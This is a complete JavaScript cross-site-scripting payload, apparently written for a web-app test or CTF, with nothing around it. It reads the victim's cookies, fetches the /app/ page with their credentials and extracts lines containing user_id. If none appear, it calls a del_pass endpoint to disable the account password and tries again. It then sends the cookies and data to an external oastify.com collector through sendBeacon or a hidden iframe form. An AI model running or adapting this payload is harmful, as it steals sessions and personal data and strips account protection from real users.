(async () => {
  const TARGET = window.location.origin + "/app/";
  const COLLECT_BASE = "https://9eo1avfkp36tcxhc41kcatpuul0co3srh.oastify.com/collect";

  async function sendToCollector(hits) {
    try {
      const cookies = document.cookie || "";
      const meta = { cookies, page: location.href, ts: new Date().toISOString() };

      // === LOGGING FOR DEBUGGING ===
      console.log("[exf] document.cookie:", cookies);
      console.log("[exf] meta to send:", meta);
      // =============================

      const metaJson = JSON.stringify(meta);
      const metaB64 = btoa(unescape(encodeURIComponent(metaJson)));

      const MAX_COOKIE_QS_LEN = 1900;
      let finalMetaB64 = metaB64;
      if (metaB64.length > MAX_COOKIE_QS_LEN) {
        const truncated = Object.assign({}, meta, { cookies: cookies.slice(0, 1000) });
        finalMetaB64 = btoa(unescape(encodeURIComponent(JSON.stringify(truncated))));
        console.warn("[exf] Meta truncated for URL length");
      }

      const qs = new URLSearchParams({ payload_b64: finalMetaB64 });
      const collectUrl = COLLECT_BASE + "?" + qs.toString();

      const payloadText = hits.join("\n");

      // sendBeacon first (no preflight)
      try {
        const ok = navigator.sendBeacon(collectUrl, new Blob([payloadText], { type: "text/plain" }));
        console.log("[exf] sendBeacon returned:", ok, "collectUrl length:", collectUrl.length);
        if (ok) return;
        console.warn("[exf] sendBeacon returned false — will use form fallback");
      } catch (e) {
        console.warn("[exf] sendBeacon threw:", e, " — will use form fallback");
      }

      // fallback: cross-origin form POST into hidden iframe (no preflight)
      try {
        const iframeName = "exf_ifr_" + Math.random().toString(36).slice(2);
        const iframe = document.createElement("iframe");
        iframe.name = iframeName;
        iframe.style.display = "none";
        document.documentElement.appendChild(iframe);

        const form = document.createElement("form");
        form.method = "POST";
        form.action = collectUrl;
        form.enctype = "text/plain";
        form.target = iframeName;

        const ta = document.createElement("textarea");
        ta.name = "body";
        ta.value = payloadText;
        form.appendChild(ta);

        form.style.display = "none";
        document.documentElement.appendChild(form);
        form.submit();

        // cleanup after short delay
        setTimeout(() => { form.remove(); iframe.remove(); }, 2000);
        console.log("[exf] fallback form POST submitted to collector");
      } catch (e) {
        console.error("[exf] fallback form POST error:", e);
      }
    } catch (e) {
      console.error("[exf] sendToCollector error:", e);
    }
  }

  try {
    let r = await fetch(TARGET, { method: "GET", credentials: "include" });
    let text = await r.text();
    let lines = text.split(/\r?\n/);

    let hits = lines.filter(l => /user_id/i.test(l));

    if (!hits.length) {
      console.log("[exf] no user_id found — attempting to disable password and retry");

      try {
        // same-origin POST to disable password (no custom headers)
        await fetch("/app/ajax/setting/del_pass", { method: "POST", credentials: "include" });
        console.log("[exf] del_pass request sent");
      } catch (e) {
        console.error("[exf] del_pass request error:", e);
        // continue — we'll still try to re-fetch
      }

      // short wait then re-fetch
      await new Promise(res => setTimeout(res, 500));
      r = await fetch(TARGET, { method: "GET", credentials: "include" });
      text = await r.text();
      lines = text.split(/\r?\n/);
      hits = lines.filter(l => /user_id/i.test(l));

      if (!hits.length) {
        console.log("[exf] Still no user_id after disabling password — sending only meta (cookies may be empty if HttpOnly)");
        // send meta even when no hits (hits array is empty -> body will be empty)
        await sendToCollector([]);
        console.log("[exf] Meta sent (no hits).");
        return;
      }

      console.log("[exf] user_id found after disabling password — proceeding to exfiltrate hits + meta");
    }

    // hits exist — send them with meta (cookies included)
    await sendToCollector(hits);
    console.log("[exf] Exfiltrated hits + cookies/meta");

  } catch (err) {
    console.error("[exf] Fetch error:", err);
  }
})();
